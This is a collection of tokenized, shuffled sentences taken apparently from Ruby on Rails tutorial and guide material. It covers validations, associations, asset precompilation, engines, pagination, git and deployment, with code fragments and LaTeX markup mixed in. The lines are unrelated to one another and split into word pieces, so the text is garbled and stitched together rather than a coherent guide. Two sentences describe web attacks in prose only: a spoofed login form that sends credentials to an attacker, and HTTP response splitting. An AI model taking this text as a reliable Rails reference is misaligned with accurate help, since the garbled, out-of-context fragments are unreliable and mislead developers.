▁The ▁first ▁method ▁is ▁\ k ode { count }, ▁which ▁simply ▁returns ▁the ▁number ▁of ▁errors :
▁This ▁sort ▁of ▁end - to - end ▁cover age ▁of ▁important ▁application ▁features ▁illustrate s ▁one ▁reason ▁why ▁integration ▁tests ▁are ▁so ▁useful .
▁We ' ll ▁next ▁add ▁a ▁follow / unfollow ▁form , ▁and ▁then ▁make ▁d ed icated ▁pages ▁for ▁ showing ▁`` following '' ▁( followed ▁users ) ▁and ▁`` followers '' .
▁class ▁ Engine ▁< ▁ :: Rails :: Engine
▁Spork ▁is ▁ready ▁and ▁list en ing ▁on ▁ 89 89 !
▁In ▁order ▁to ▁use ▁ optimistic ▁ lock ing , ▁the ▁table ▁needs ▁to ▁have ▁a ▁column ▁called ▁` lock _ version ` ▁of ▁type ▁ integer ▖
▁The ▁validation ▁happens ▁by ▁perform ing ▁an ▁SQL ▁query ▁into ▁the ▁model ' s ▁table ,╼ search ing ▁for ▁an ▁existing ▁record ▁with ▁the ▁same ▁value ▁in ▁that ▁attribute .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁then ▁use ▁the ▁authentication ▁machinery ▁from ▁Section ~\ ref { sec : adding _ a _ secure _ password } ▁to ▁let ▁users ▁log ▁into ▁the ▁site .
▁If ▁set ▁to ▁false , ▁then ▁the ▁ Customer ▁class ▁will ▁use ▁the ▁` customer ` ▁table .
▁This ▁uses ▁the ▁common ▁but ▁ potentially ▁confusing ▁construction
▁</ ul >
▁You ▁should ▁also ▁\ href { https :// bitbucket ▖ org / repo / create } { create ▁a ▁new ▁repository } ▁by ▁click ing ▁on ▁the ▁`` Create '' ▁button ▁at ▁Bitbucket ▁( Figure ~\ ref { fig : create _ demo _ repository }), ▁and ▁then ▁push ▁up ▁to ▁the ▁remote ▁repository :
▁@ assembly ▁= ▁@ part ▖ assemblies ▖ build ( { assembly _ name : ▁" Trans mis s ion ▁h ous ing " })
▁<%= ▁image _ tag ▁" icon s / delete ▖ g if ", ▁ { height : ▁ 45 } ▁%>
▁ Engine er ing ▁notation ▁is ▁ still ▁supported :
▁A ▁template ▁for ▁code ▁to ▁show ▁only ▁active ▁users .
▁When ▁you ▁refresh ▁< http :// localhost :3000/ articles / new > ▁you ' ll ▁now ▁see ▁that ▁the ╼ page ▁has ▁a ▁title ▖
▁There ▁are ▁a ▁few ▁ limit ation s ▁to ▁` inverse _ of ` ▁support :
▁following
▁A ▁form ▁for ▁following ▁a ▁user ▁using ▁Ajax .
▁orders ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁In ▁fact , ▁if ▁you ▁have ▁\ href { http :// rvm ▖ io / rvm / install /}{ install ed ▁ RVM }, ▁you ▁already ▁have ▁ RubyGems , ▁since ▁ RVM ▁includes ▁it ▁automatically :
▁Using ▁Ajax ▁in ▁Rails ▁is ▁a ▁large ▁and ▁ fast - mov ing ▁subject , ▁so ▁we ' ve ▁only ▁been ▁able ▁to ▁scratch ▁the ▁ s ur fa ce ▁here , ▁but ▁( as ▁with ▁the ▁rest ▁of ▁the ▁material ▁in ▁this ▁tutorial ) ▁our ▁treat ment ▁should ▁give ▁you ▁a ▁good ▁foundation ▁for ▁more ▁advanced ▁resources .
▁# ▁In clu de ▁the ▁ authenticity ▁token ▁in ▁remote ▁forms .
▁find ▁by
▁* ▁How ▁to ▁a d just ▁the ▁behavior ▁of ▁your ▁Rails ▁applications .
▁If ▁you ▁have ▁multiple ▁engines ▁that ▁need ▁migrations ▁copie d ▁over , ▁use ╼` railties : install : migrations ` ▁instead :
▁If ▁the ▁CDN ▁does ▁not ▁have ▁a ▁copy ▁it ╼ will ▁try ▁to ▁find ▁it ▁a ▁the ▁" origin " ▁` example ▖ com / assets / s m ile ▖ png ` ▁and ▁then ▁store ╼ it ▁for ▁future ▁use .
▁real 	 0 m 8 ▖ 6 3 3 s
▁When ▁using ▁[ Active ▁Record ╼ ▁ Migration s ]( migrations ▖ html ) ▁to ▁create ▁your ▁table s , ▁this ▁column ▁will ▁be ╼ ▁automatically ▁created .
▁validates ▁ FILL _ IN , ▁presence : ▁true ▁# ▁Re p la ce ▁ FILL _ IN ▁with ▁the ▁right ▁code ▖╼ ▁validates ▁ FILL _ IN , ▁presence : ▁true ▁# ▁Re p la ce ▁ FILL _ IN ▁with ▁the ▁right ▁code ▖╼ end ╼\ end { code }╼\ end { code listing }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / user _ presence _ validations ▖ png }╼\ end { center }╼\ caption { The ▁effect ▁of ▁presence ▁validations ▁on ▁the ▁User ▁model ▖ \ label { fig : user _ presence _ validations } }╼\ end { figure }╼╼ ▁% ▁subsection ▁ demo _ user _ has _ many _ microposts ▁( end )╼╼ ▁\ subsection { In her it ance ▁ hierarchies } ▁% ▁( fold )╼ ▁\ label { sec : inheritance _ hierarchies }╼╼
▁( This ▁code ▁introduce s ▁\ k ode { response ▖ body }, ▁which ▁returns ▁the ▁full ▁HTML ▁ body ▁of ▁the ▁page ▖)
▁As ▁before , ▁we ' ll ▁use ▁the ▁\ k ode { will \_ paginate } ▁method :
▁Then ▁merge ▁back ▁into ▁the ▁master ▁branch :
▁Compute s ▁the ▁path ▁to ▁a ▁stylesheet ▁asset ▁in ▁the ▁` app / assets / stylesheets ` ▁directory ▖
▁The ▁\ k ode { flash } ▁ ERb ▁in ▁the ▁site ▁layout ▁using ▁\ k ode { content \_ tag } .
▁< style > <%= ▁yield ▁: stylesheets ▁%></ style >
▁self ▖ author ▁= ▁User ▖ find _ or _ create _ by ( name : ▁author _ name )
▁=> ▁" ra bo of "
▁A ▁template ▁for ▁the ▁ sidebar ▁micropost ▁count ▁test .
▁As ▁noted ▁in ▁Section ~\ ref { sec : demo _ users _ resource }, ▁the ▁use ▁of ▁\ k ode { bundle ▁exec } ▁is ▁unnecessary ▁on ▁some ▁systems , ▁including ▁the ▁cloud ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment }, ▁but ▁I ▁include ▁it ▁for ▁completeness .
▁The ▁result ing ▁page ▁( Figure ~\ ref { fig : signup _ flash }) ▁shows ▁a ▁ friendly ▁message ▁upon ▁successful ▁signup , ▁including ▁nice ▁green ▁styling ▁for ▁the ▁\ k ode { success } ▁class , ▁which ▁comes ▁included ▁with ▁the ▁Bootstrap ▁CSS ▁framework ▁from ▁Section ~\ ref { sec : custom _ css } .
▁in ▁Listing ~\ ref { code : correct _ signin _ failure } .
▁The ▁` find _ or _ initialize _ by ` ▁method ▁will ▁work ▁just ▁like ╼` find _ or _ create _ by ` ▁but ▁it ▁will ▁call ▁` new ` ▁instead ▁of ▁` create ` ▖
▁As ▁a ▁final ▁step ▁in ▁handling ▁failed ▁user ▁creation , ▁we ' ll ▁add ▁helpful ▁error ▁messages ▁to ▁indicate ▁the ▁problem s ▁that ▁prevent ed ▁successful ▁signup .
▁More ▁important ly , ▁will ▁run ▁upon ▁every ▁request ▁in ▁` development `, ▁but ▁only ▁once ▁( d ur ing ▁b oo t - up ) ▁in ▁` production ` ▁and ▁` test ` .
▁#### # ▁` distinct `
▁" digest ":" 723 d 1 be 6 cc 7 4 1 a 3 a abb 1 ce c 242 76 d 6 8 1 " }, " application - 12 b 3 c 7 d d 7 4 d 2 e 9 d f 37 e 7 c b b 1 e fa 76 a 6 d ▖ css ":{" logical _ path ":" application ▖ css "," m time " : "2013-0 7-2 6 T 22 : 5 4 : 5 4 - 07 :00 "," size " : 15 60 ,
▁As ▁a ▁b on us , ▁by ▁using ▁base 64 ▁strings ▁specifically ▁design ed ▁to ▁be ▁ safe ▁in ▁URLs ▁( as ▁indicate d ▁by ▁the ▁name ▁\ k ode { url safe \_ base 64 }), ▁we ' ll ▁be ▁able ▁to ▁use ▁the ▁same ▁token ▁generator ▁to ▁make ▁account ▁activation ▁and ▁password ▁reset ▁links ▁in ▁Chapter ~\ ref { cha : password _ reset } .
▁A ▁more ▁special ize d ▁attack ▁could ▁ overlap ▁the ▁entire ▁web ▁site ▁or ▁display ▁a ▁login ▁form , ▁which ▁look s ▁the ▁same ▁as ▁the ▁site ' s ▁original , ▁but ▁ tr an s m it s ▁the ▁user ▁name ▁and ▁password ▁to ▁the ▁attacker ' s ▁site ▖
▁To ▁define ▁a ▁simple ▁scope , ▁we ▁use ▁the ▁` scope ` ▁method ▁inside ▁the ▁class , ▁passing ▁the ▁query ▁that ▁we ' d ▁like ▁to ▁run ▁when ▁this ▁scope ▁is ▁called :
▁Now ▁that ▁we ' ve ▁defined ▁validations ▁for ▁the ▁name ▁and ▁email ▁fields , ▁we ' re ▁ready ▁to ▁add ▁the ▁last ▁of ▁the ▁basic ▁User ▁attributes : ▁a ▁secure ▁password .
▁authentication
▁mail ▁= ▁mail ▖ deliver _ now ▁# ▁P ri nt s ▁" C all ed "
▁Now ▁the ▁toy ▁application ▁should ▁be ▁available ▁on ▁the ▁local ▁server ▁as ▁describe d ▁in ▁Section ~\ ref { sec : rails _ server } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : fixture _ second _ user } .
▁| ▁| ▁42 6 ▁| ▁: up grade _ require d ▁|
▁Having ▁created ▁and ▁ filled ▁in ▁the ▁Home ▁and ▁Help ▁pages ▁for ▁our ▁sample ▁app ▁( Section ~\ ref { sec : custom _ static _ pages }), ▁now ▁we ' re ▁going ▁to ▁add ▁an ▁About ▁page ▁as ▁well .
▁#### ▁` find _ in _ batches `
▁### ▁ Atom F e ed Helper
▁Rails ▁on ▁Rack
▁$ ▁rake ▁rails : update
▁For t un ate ly , ▁\ k ode { : uniqueness } ▁accept s ▁an ▁option , ▁\ k ode { : case \_ sensitive }, ▁for ▁just ▁this ▁purpose ▁( Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive }) .
▁To ▁make ▁this ▁route ▁always ▁use ▁the ▁engine ' s ▁` articles _ path ` ▁routing ▁helper ▁method ,╼ we ▁must ▁call ▁the ▁method ▁on ▁the ▁routing ▁ proxy ▁method ▁that ▁share s ▁the ▁same ▁name ▁as ╼ the ▁engine .
▁# ▁C on fi rm s ▁an ▁admin ▁user .
▁A ▁mockup ▁of ▁successful ▁signup .
▁class ▁ Comment ▁< ▁ActiveRecord :: Base
▁ vendor / assets / javascripts / s li d er ▖ js
▁* ▁What ▁parameters ▁to ▁expect ▁an ▁action ▁to ▁receive .
▁If ▁you ▁are ▁using ▁Rails ▁with ▁the ▁[ Asset ▁Pipeline ]( asset _ pipeline ▖ html ) ▁enabled , ▁this ▁helper ▁will ▁generate ▁a ▁link ▁to ▁` / assets / javascripts / ` ▁rather ▁than ▁` public / javascripts ` ▁which ▁was ▁used ▁in ▁earlier ▁versions ▁of ▁Rails ▖
▁The ▁code ▁in ▁Listing ~\ ref { code : demo _ length _ validation } ▁may ▁look ▁rather ▁mysterious --- we ' ll ▁cover ▁validations ▁more ▁ th or ough ly ▁starting ▁in ▁Section ~\ ref { sec : user _ validations } --- but ▁its ▁effect s ▁are ▁read ily ▁apparent ▁if ▁we ▁go ▁to ▁the ▁new ▁micropost ▁page ▁and ▁enter ▁more ▁than ▁ 140 ▁characters ▁for ▁the ▁content ▁of ▁the ▁post .
▁# ▁ Log ▁the ▁query ▁plan ▁for ▁queries ▁tak ing ▁more ▁than ▁this ▁( work s
▁By ▁default , ▁this ▁will ▁look ▁quite ▁ugly :
▁### ▁S um
▁P repared ▁Statements ▁are ▁enabled ▁by ▁default ▁on ▁PostgreSQL ▖
▁Here ▁the ▁call ▁to ▁\ k ode { to \_ a } ▁effective ly ▁make s ▁a ▁copy ▁of ▁the ▁microposts , ▁and ▁we ' ve ▁included ▁the ▁line
▁INFO : ▁The ▁following ▁methods ▁return ▁a ▁` Time ` ▁object ▁if ▁possible , ▁otherwise ▁a ▁` DateTime ` ▖
▁This ▁guide ▁provides ▁steps ▁to ▁be ▁followed ▁when ▁you ▁upgrade ▁your ▁applications ▁to ▁a ▁new er ▁version ▁of ▁Ruby ▁on ▁Rails ▖
▁Co nt in u ing ▁with ▁the ▁` find _ or _ create _ by ` ▁example , ▁we ╼ now ▁want ▁the ▁client ▁named ▁' N ic k ' :
▁( In clu d ing ▁\ k ode { new } ▁actually ▁generates ▁\ emph { views } ▁as ▁well , ▁which ▁is ▁why ▁we ▁don ' t ▁include ▁actions ▁like ▁\ k ode { create } ▁and ▁\ k ode { delete } ▁that ▁don ' t ▁correspond ▁to ▁views ▖)
▁We e k s ▁are ▁assume d ▁to ▁start ▁on ╼ M on day , ▁but ▁that ▁can ▁be ▁changed ▁passing ▁an ▁argument , ▁setting ▁thread ▁local ╼` Date ▖ beginning _ of _ week ` ▁or ▁` config ▖ beginning _ of _ week ` .
▁$ ▁git ▁ checkout ▁master
▁in ▁Listing ~\ ref { code : production _ webserver _ config } .
▁#### ▁Using ▁Pass en g er
▁╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : static _ pages _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁T a i l ▁your ▁\ k ode { log / development ▖ log } ▁file ▁if ▁you ' re ▁curious ▁about ▁the ▁SQL ▁this ▁method ▁generates .
▁### ▁S el f ▁ J o in s
▁This ▁generator ▁call ▁will ▁generate ▁just ▁the ▁necessary ▁model ▁files ▁it ▁needs ,╼ name spacing ▁the ▁files ▁under ▁a ▁` blorgh ` ▁directory ▁and ▁creating ▁a ▁model ▁class ╼ called ▁` Blorgh :: Comment ` ▖
▁--------- ----------------
▁At ▁present , ▁ Cloud 9 ▁includes ▁an ▁old er ▁version ▁of ▁Rails ▁that ▁is ▁in com p at ible ▁with ▁the ▁present ▁tutorial , ▁which ▁is ▁one ▁reason ▁why ▁it ' s ▁so ▁important ▁to ▁install ▁it ▁our s el ve s .
▁The ▁idea ▁of ▁ Response ▁S p li tt ing ▁is ▁to ▁ inject ▁two ▁ CRLF s ▁into ▁a ▁header ▁field , ▁followed ▁by ▁another ▁response ▁with ▁ malicious ▁HTML ▖
▁If ▁you ▁wish ▁to ▁reference ▁the ▁application ▁inside ▁the ▁engine ▁in ▁a ▁similar ▁way , ▁use ╼ the ▁` main _ app ` ▁helper :
▁# ▁=> ▁ Bo ld ▁no ▁more !
▁module ▁Blorgh
▁First , ▁note ▁the ▁link ▁to ▁change ▁the ▁Gravatar ▁image ; ▁if ▁you ▁ po k e ▁around ▁the ▁Gravatar ▁site , ▁you ' ll ▁see ▁that ▁the ▁page ▁to ▁add ▁or ▁edit ▁images ▁is ▁located ▁at ▁\ href { http :// gravatar ▖ com / email s } { http :// gravatar ▖ com / email s }, ▁so ▁we ▁test ▁the ▁\ k ode { edit } ▁page ▁for ▁a ▁link ▁with ▁that ▁URL
▁< body >
▁TIP : ▁You ▁don ' t ▁need ▁to ▁call ▁` to _ xml ` ▁on ▁the ▁object ▁that ▁you ▁want ▁to ▁render ▖
▁Co un ter ▁cache ▁columns ▁are ▁added ▁to ▁the ▁containing ▁model ' s ▁list ▁of ▁read - only ▁attributes ▁through ▁` attr _ readonly ` .
▁It ▁accept s ▁a ▁hash ▁of ▁options , ▁which ▁can ▁include ▁any ▁of ▁these ▁options :
▁Using ▁\ text tt { let }
▁The ▁\ k ode { Application Controller } ▁class , ▁highlight ing ▁inheritance .
▁* ▁Call ▁` head ` ▁to ▁create ▁a ▁response ▁consist ing ▁so le ly ▁of ▁HTTP ▁headers ▁to ▁send ▁back ▁to ▁the ▁browser
▁ Example s ▁of ▁` in ?` :
▁in ▁Listing ~\ ref { code : relationship _ create _ test } .
▁For ▁example , ▁in ▁Listing ~\ ref { code : universal _ css } ▁we ▁have ▁rules ▁both ▁for ▁\ k ode { ▖ center } ▁and ▁for ▁\ k ode { ▖ center ▁h 1 } :
▁This ▁is ▁generally ▁known ▁as ▁ _ cache ▁b us ting _ .
▁The ▁Micropost ▁migration ▁with ▁added ▁index .
▁Implement ing ▁\ k ode { user ▖ followers } ▁using ▁ reverse ▁relationships .
▁In ▁addition ▁to ▁the ▁generic ▁\ k ode { find }, ▁Active ▁Record ▁also ▁allows ▁us ▁to ▁find ▁users ▁by ▁specific ▁attributes :
▁With ▁Active ▁Record ▁associations , ▁we ▁can ▁ str ea m line ▁these ▁- ▁and ▁other ▁- ▁operations ▁by ▁declar a tive ly ▁tell ing ▁Rails ▁that ▁there ▁is ▁a ▁connection ▁between ▁the ▁two ▁models ▖
▁S ub m it ting ▁the ▁\ href { http ://0▖0▖0▖0:3000/ sessions / new }{/ sessions / new } ▁form ▁then ▁yields ▁the ▁result ▁show n ▁in ▁Figure ~\ ref { fig : initial _ failed _ signin _ rails _3} .
▁You ▁can ▁just ▁supply ▁the ▁raw ▁SQL ▁specify ing ▁the ▁` JOIN ` ▁clause ▁to ▁` joins `:
▁Defaults ▁to ▁`: erb ` .
▁User ▖ active ▖ where ( state : ▁' finished ')
▁You ▁should ▁confirm ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁passes :
▁t ▖ string ▁: publish er _ type
▁A mong ▁them ▁are :
▁foreign _ key : ▁" this _ user _ id ",
▁This ╼ me an s ▁that ▁a ▁new ▁model ▁instance ▁will ▁be ▁created ▁in ▁memory ▁but ▁won ' t ▁be ╼ save d ▁to ▁the ▁database ▖
▁Rails ▁would ▁see ▁`` followed s '' ▁and ▁use ▁the ▁ singular ▁`` followed '' , ▁assembl ing ▁a ▁collection ▁using ▁the ▁\ k ode { followed \_ id } ▁in ▁the ▁\ k ode { relationships } ▁table .
▁If ▁an ▁optional ▁block ▁is ▁given , ▁` many ?` ▁only ▁take s ▁into ▁account ▁those ▁elements ▁that ▁return ▁true :
▁class ▁C
▁In ▁production , ▁Rails ▁ precompile s ▁these ▁files ▁to ▁` public / assets ` ▁by ▁default ▖
▁Next , ▁the ▁partial ▁that ▁this ▁line ▁will ▁render ▁needs ▁to ▁exist ▖
▁Note ▁that ▁the ▁\ k ode { remember \_ token } ▁argument ▁in ▁the ▁\ k ode { authenticated ?}\ ▁method ▁defined ▁in ▁Listing ~\ ref { code : authenticated _ p } ▁is ▁not ▁the ▁same ▁as ▁the ▁ accessor ▁that ▁we ▁defined ▁in ▁Listing ~\ ref { code : user _ model _ remember } ▁using ▁\ k ode { attr \_ accessor ▁: remember \_ token } ; ▁instead , ▁it ▁is ▁a ▁variable ▁local ▁to ▁the ▁method .
▁Object ▖ qualified _ const _ set (" Math :: P hi ", ▁1▖ 6 1 80 34 ) ▁# ▁=> ▁1▖ 6 1 80 34
▁And ▁this ▁will ▁give ▁you ▁a ▁single ▁` Order ` ▁object ▁for ▁each ▁date ▁where ▁there ▁are ▁orders ▁in ▁the ▁database .
▁╼╼ ▁\ subsection { Heroku ▁deployment , ▁step ▁one } ╼ ▁\ label { sec : heroku _ step _ one }╼╼
▁This ▁load s ▁all ▁the ▁articles ▁and ▁the ▁ associated ▁ category ▁and ▁comments ▁for ▁each ▁article .
▁statement _ limit : ▁200
▁At ▁this ▁point , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁The ▁tests ▁should ▁all ▁be ▁passing ▁now .
▁The ▁` find _ each ` ▁method ▁retrieve s ▁a ▁ batch ▁of ▁records ▁and ▁then ▁yields ▁ _ each _ ▁record ▁to ▁the ▁block ▁individual ly ▁as ▁a ▁model ▖
▁If ▁they ▁are ▁implemented ▁using ▁JavaScript , ▁they ▁may ▁be ▁by pass ed ▁if ╼ ▁JavaScript ▁is ▁turn ed ▁off ▁in ▁the ▁user ' s ▁browser ▖
▁Because ▁we ▁included ▁\ k ode { will \_ paginate } ▁both ▁above ▁and ▁below ▁the ▁user ▁list , ▁the ▁pagination ▁links ▁appear ▁in ▁both ▁place s .
▁Tests ▁to ▁enforce ▁logged - in ▁status ▁m ir r or ▁those ▁for ▁the ▁Users ▁controller ▁( Listing ~\ ref { code : edit _ update _ redirect _ tests } ▁and ▁Listing ~\ ref { code : action _ tests _ admin }) .
▁If ▁a ▁block ▁is ▁passed ▁the ▁ separator s ▁are ▁those ▁elements ▁of ▁the ▁array ▁for ▁which ▁the ▁block ▁returns ▁true :
▁### ▁E age r ▁Load ing ▁M ultiple ▁Associations
▁The ▁second ▁change ▁needed ▁to ▁get ▁Listing ~\ ref { code : micropost _ form } ▁to ▁work ▁is ▁to ▁re define ▁the ▁error - messages ▁partial ▁so ▁the ▁following ▁code ▁from ▁Listing ~\ ref { code : micropost _ form } ▁works :
▁Here ▁we ' ve ▁generated ▁the ▁necessary ▁\ k ode { account \_ activation } ▁method ▁as ▁well ▁as ▁the ▁\ k ode { password \_ reset } ▁method ▁we ' ll ▁need ▁in ▁Section ~\ ref { sec : password _ reset } .
▁The ▁first ▁and ▁preferred ▁method ▁is ▁to ▁use ▁ RVM , ▁which ▁includes ▁Bundler ▁integration ▁as ▁of ▁version ▁1▖ 11 .
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁to _ visit ▁<< ▁ n ode ▁if ▁visit ed ▖ exclude ?(
▁redirect _ to ▁photos _ path , ▁status : ▁30 1
▁If ▁no ▁ associated ▁object ▁is ▁found , ▁it ▁returns ▁` nil ` .
▁ V a ri able s
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / reachable ▖ rb ` .
▁We ▁can ▁achieve ▁this ▁in ▁two ▁ways ▖
▁As ▁a ▁result , ▁the ▁initial ▁guess ▁of
▁#### ▁` symbolize _ keys ` ▁and ▁` symbolize _ keys !
▁In ▁the ▁re main d er ▁of ▁this ▁guide , ▁you ' ll ▁learn ▁how ▁to ▁declare ▁and ▁use ▁the ▁ various ▁forms ▁of ▁associations ▖
▁We ' ll ▁start ▁by ▁adding ▁the ▁special ▁\ k ode { will \_ paginate } ▁method ▁in ▁the ▁view ▁( Listing ~\ ref { code : will _ paginate _ index _ view }) ; ▁we ' ll ▁see ▁in ▁a ▁moment ▁why ▁the ▁code ▁appears ▁both ▁above ▁and ▁below ▁the ▁user ▁list .
▁specifie s ▁where ▁in ▁the ▁loading ▁ sequence ▁the ▁CSS ▁in ▁\ k ode { application ▖ css } ▁itself ▁get s ▁included .
▁ Adding ▁a ▁root ▁route ▁for ▁users .
▁redirect _ to ▁@ article
▁For ▁simplicity , ▁all ▁command ▁line ▁examples ▁use ▁a ▁Unix - style ▁command ▁line ▁pro mp t ▁( a ▁do ll ar ▁sign ), ▁as ▁follows :
▁ Don ' t ▁use ▁this ▁line .
▁The ▁result ▁of ▁making ▁a ▁successful ▁submission ▁by ▁hand ▁appears ▁in ▁Figure ~\ ref { fig : micropost _ with _ image } .
▁**` Rails :: Rack :: Logger ` **
▁Method
▁self ▖ default _ params ▁= ▁ {
▁Listing ~\ ref { code : unicorn _ config } ▁changes ▁the ▁format ting ▁slightly ▁so ▁that ▁the ▁code ▁fit s ▁in ▁the ▁standard ▁ 80 ▁columns .
▁You ' ll ▁note ▁that ▁it ▁differ s ▁in ▁some ▁details --- for ▁example , ▁we ' ll ▁end ▁up ▁adding ▁a ▁Rails ▁ logo ▁on ▁the ▁page --- but ▁that ' s ▁fine , ▁since ▁a ▁mockup ▁need ▁not ▁be ▁exact .
▁The ▁Rails ▁\ k ode { debug } ▁information ▁is ▁show n ▁as ▁\ href { http :// www ▖ y a m l ▖ org /}{ YAML } ▁( a ▁\ href { http :// cat b ▖ org / j argon / html / R / recursive - acronym ▖ html } { recursive ▁ acronym } ▁stand ing ▁for ▁`` YAML ▁A in ' t ▁Mar k up ▁ Language '') , ▁which ▁is ▁a ▁ friendly ▁data ▁format ▁design ed ▁to ▁be ▁both ▁machine - ▁\ emph { and } ▁ human - read able .
▁The ▁step ▁file ▁go es ▁in ▁the ▁\ k ode { feature s / step \_ de f in it ion s } ▁directory ; ▁we ' ll ▁call ▁it ▁\ k ode { authentication \_ step s ▖ rb } .
▁We ' ll ▁fix ▁this ▁blemish ▁in ▁Section ~\ ref { sec : cha n g ing _ the _ layout _ links } ▖)
▁An ▁X m l M ar k up ▁object ▁named ▁` xml ` ▁is ▁automatically ▁made ▁available ▁to ▁templates ▁with ▁a ▁` ▖ builder ` ▁extension .
▁# ▁Before ▁filter s
▁Having ▁placed ▁the ▁user ' s ▁id ▁secure ly ▁in ▁the ▁temporary ▁session , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁retrieve ▁it ▁on ▁subsequent ▁pages , ▁which ▁we ' ll ▁do ▁by ▁defin ing ▁a ▁\ k ode { current \_ user } ▁method ▁to ▁find ▁the ▁user ▁in ▁the ▁database ▁corresponding ▁to ▁the ▁session ▁id .
▁( A t ▁this ▁point , ▁I ▁also ▁recommend ▁remov ing ▁the ▁\ k ode { hello } ▁action ▁from ▁the ▁Application ▁controller ▁if ▁you ▁added ▁it ▁at ▁the ▁beginning ▁of ▁this ▁section ▖)
▁* ▁Re present ▁associations ▁between ▁these ▁models .
▁** S ol u tion ▁to ▁N ▁+ ▁1 ▁queries ▁problem **
▁group ▁: production ▁do
▁The ▁result ▁of ▁visit ing ▁\ href { http :// localhost :3000/ signup }{/ signup } ▁and ▁just ▁click ing ▁`` Create ▁my ▁account '' ▖ ~\ href { http :// railstutorial ▖ org / images / figures / blank _ signup _ password _ digest _ bootstrap _4_0 - full ▖ png }{( full ▁size )}
▁Because ▁Rails ▁controllers ▁generally ▁share ▁code ▁for ▁things ▁like ▁authentication ╼ and ▁access ing ▁session ▁variables , ▁they ▁inherit ▁from ▁` Application Controller ` ▁by ╼ default ▖
▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁G ood ▁inter active ▁online ▁programming ▁course s
▁We ' ll ▁fix ▁our ▁test ▁suite ▁by ▁logging ▁the ▁user ▁in ▁before ▁hit ting ▁the ▁edit ▁or ▁update ▁actions .
▁It ▁also ▁add s ▁the ▁ additional ▁ condition ▁that ▁the ▁object ▁must ▁be ▁in ▁the ▁collection .
▁If ▁you ▁wait ▁a ▁couple ▁of ▁minutes ▁and ▁ reload ▁the ▁pages , ▁you ' ll ▁see ▁how ▁the ▁text ▁get s ▁automatically ▁updated ▁base d ▁on ▁the ▁new ▁time .
▁ Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` goodbye , ▁world !'' .
▁U nfortunately , ▁this ▁is ▁ im possibl e ▁to ▁arrange ▁with ▁fixtures , ▁and ▁adding ▁a ▁\ k ode { password } ▁attribute ▁to ▁Listing ~\ ref { code : real _ user _ fixture } ▁cause s ▁Rails ▁to ▁complain ▁that ▁there ▁is ▁no ▁such ▁column ▁in ▁the ▁database ▁( which ▁is ▁true ) .
▁As ▁with ▁login ▁( Listing ~\ ref { code : correct _ login _ failure }), ▁in ▁the ▁case ▁of ▁an ▁invalid ▁submission ▁we ▁re - render ▁the ▁\ k ode { new } ▁page ▁with ▁a ▁\ k ode { flash ▖ now } ▁message .
▁<%= ▁form _ for ( zone ) ▁do ▁| f | ▁%>
▁If ▁we ▁me e t ▁some ▁day , ▁and ▁you ▁think
▁* ▁` config ▖ active _ record ▖ logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁then ▁passed ▁on ▁to ▁any ▁new ▁database ▁connection s ▁made ▖
▁* ▁Use ▁ assert _ not ▁methods ▁instead ▁of ▁ ref ute .
▁ Adding ▁microposts ▁creation ▁to ▁the ▁Home ▁page ▁(\ href { http :// localhost :3000/}{/}) .
▁use ▁Rack :: MethodOverride
▁It ▁is ▁by ▁inherit ing ▁from ▁\ k ode { ActiveRecord :: Base } ▁that ▁our ▁model ▁objects ▁gain ▁the ▁ability ▁to ▁communicat e ▁with ▁the ▁database , ▁treat ▁the ▁database ▁columns ▁as ▁Ruby ▁attributes , ▁and ▁so ~ on .
▁You ▁should ▁change ▁them ▁to ▁use ▁class ▁methods , ▁e ▖ g ▖ ▁` self ▖ serialize d _ attributes ` ▁to ▁` self ▖ class ▖ serialize d _ attributes ` .
▁"/ Users / ry an / Site s / side _ projects / blorgh / test / dummy / app / views " ▁*
▁I ▁also ▁like ▁to ▁use ▁\ k ode { co } ▁in ▁place ▁of ▁the ▁more ▁verb o se ▁\ k ode { checkout } ▁command , ▁which ▁we ▁can ▁arrange ▁as ▁follows :
▁We ▁could ▁use ▁the ▁user ' s ▁id ▁instead , ▁since ▁it ' s ▁already ▁expose d ▁in ▁the ▁URLs ▁of ▁our ▁application , ▁but ▁using ▁email ▁addresses ▁is ▁more ▁future - proof ▁in ▁case ▁we ▁want ▁to ▁ ob f us c ate ▁user ▁id s ▁for ▁any ▁reason ▁( such ▁as ▁to ▁prevent ▁ com pe t it or s ▁from ▁know ing ▁how ▁many ▁users ▁our ▁application ▁has , ▁for ▁example ) .
▁For ▁example , ▁instead ▁of :
▁#### ▁The ▁H ar d ▁Way
▁The ▁next ▁two ▁cases ▁correspond ▁to ▁the ▁two ▁branch es ▁in ▁the ▁main ▁\ k ode { if } ▁statement ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } .
▁ attr _ internal ▁: controller , ▁: template
▁admin ▖ validates ▁: email , ▁presence : ▁true
▁If ▁you ▁are ▁ deploying ▁a ▁production ▁application ▁to ▁a ▁system ▁without ▁any ╼ pre - ex ist ing ▁JavaScript ▁run times , ▁you ▁may ▁want ▁to ▁add ▁one ▁to ▁your ▁Gemfile :
▁For ▁example , ▁consider ▁this ▁model :
▁A ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ ( computer _ science ) }{\ emph { session } } ▁is ▁a ▁ s em i - permanent ▁connection ▁between ▁two ▁computer s , ▁such ▁as ▁a ▁client ▁computer ▁running ▁a ▁web ▁browser ▁and ▁a ▁server ▁running ▁Rails .
▁Then ▁move ▁on .
▁ / about
